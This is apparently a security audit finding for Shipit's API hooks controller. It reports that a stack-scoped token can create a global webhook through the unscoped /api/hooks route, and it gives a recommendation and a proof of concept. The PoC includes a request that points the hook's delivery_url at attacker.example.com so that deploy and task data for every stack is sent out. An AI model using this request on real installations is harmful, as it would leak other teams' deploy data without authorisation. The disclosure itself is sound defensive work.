## Finding

### Title
Stack-scoped API token can create a global webhook and read task/deploy output for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The bug reported in the external report is a "trusted amount vs. actual balance" mismatch: a value that should be clamped to what the caller actually controls is instead trusted directly, letting an operation exceed its authorized scope. The equivalent pattern exists in Shipit's API hooks endpoint: an `ApiClient` token that is *scoped to a single stack* is authorized to act on that stack only, but `Shipit::Api::HooksController` never enforces that scope when the `stack_id` route/param is omitted, letting the same token create a **global** `Hook` that receives events for **every** stack in the installation.

### Finding Description
`Shipit::ApiClient` can be scoped to a single stack via `belongs_to :stack, optional: true` [1](#0-0) . `Shipit::Api::BaseController` is supposed to enforce this scope for every stack-touching action: `stacks` restricts the visible/queryable stacks to `Stack.where(id: current_api_client.stack_id)` when the client is scoped, and `stack` resolves `params[:stack_id]` against that restricted set [2](#0-1) .

However, `Shipit::Api::HooksController` only calls `stack` (and thus only applies the scoping) when `params[:stack_id]` happens to be present:
```ruby
def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

The `hooks` collection used by `create`/`index`/`show`/`update`/`destroy` is `Hook.where(stack_id:)` [4](#0-3) , and permission checks are only the flat `write:hook`/`read:hook` permissions, with no stack-scope check at all [5](#0-4) .

`config/routes.rb` mounts the exact same `HooksController` twice: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once as a top-level, un-scoped resource (`/api/hooks`) [6](#0-5) . Hitting the top-level route never sets `params[:stack_id]`, so `stack_id` returns `nil` and a `Hook` is created with `stack_id: nil`, i.e. a **global hook**.

Global hooks (`stack_id: nil`) are delivered for every stack: `Hook.for_stack(stack_id)` matches `stack_id: [nil, stack_id]` [7](#0-6) , and `Hook.deliver` is invoked for every task/deploy/rollback/lock/commit_status/pull_request event across the whole installation, POSTing the full JSON payload (deploy links, task output permalinks, commit SHAs, authors, statuses) to the attacker-supplied `delivery_url` [8](#0-7) .

This breaks the binding: **stack a token authorizes == stack a token's write:hook action touches**. A token whose `stack_id` restricts it to stack A is able to make its `write:hook` action touch every other stack in the deployment (unauthorized read of deploy/task output for stacks B, C, ... that the token was never granted access to).

### Impact Explanation
This matches the High-severity bucket "unauthenticated read of stack state, task streams or deploy output" via SSRF-style exfiltration to an attacker-controlled URL — except here it is *cross-stack* read: a token legitimately scoped to one stack escalates to receiving webhook deliveries (deploy output permalinks, commit metadata, task status, user identities) for every stack managed by the Shipit instance, none of which it was authorized to access.

### Likelihood Explanation
Any deployment of shipit-engine that issues stack-scoped `ApiClient` tokens with `write:hook` permission (a normal use case — letting a team manage its own stack's webhooks) is exposed. Exploitation requires no special access beyond the token itself and a single unauthenticated POST to the un-scoped `/api/hooks` route, which is mounted by default via `config/routes.rb`.

### Recommendation
Enforce the `ApiClient#stack_id` scope inside `Shipit::Api::HooksController` regardless of whether `params[:stack_id]` is present — e.g., always resolve `stack_id` through `current_api_client.stack_id? ? current_api_client.stack_id : params[:stack_id] && stack.id`, and reject (403) any attempt by a stack-scoped client to create/read/update/destroy a hook with `stack_id: nil` or a `stack_id` different from its own.

### Proof of Concept
1. Issue (or obtain) an `ApiClient` token scoped to stack A with `write:hook` permission (a normal “manage my stack's webhooks” token).
2. `POST /api/hooks` (the top-level, un-scoped route) with Basic Auth using that token:
   ```
   POST /api/hooks
   Authorization: Basic <base64(token)>
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","rollback","commit_status"] }
   ```
3. `HooksController#stack_id` returns `nil` (no `params[:stack_id]`), so `Hook.where(stack_id: nil).create(...)` creates a **global** hook.
4. From then on, every deploy/task/rollback/commit_status event for **every stack** in the installation is delivered to `https://attacker.example.com/collect`, leaking task output permalinks, commit SHAs, and user data for stacks the token was never authorized to touch.
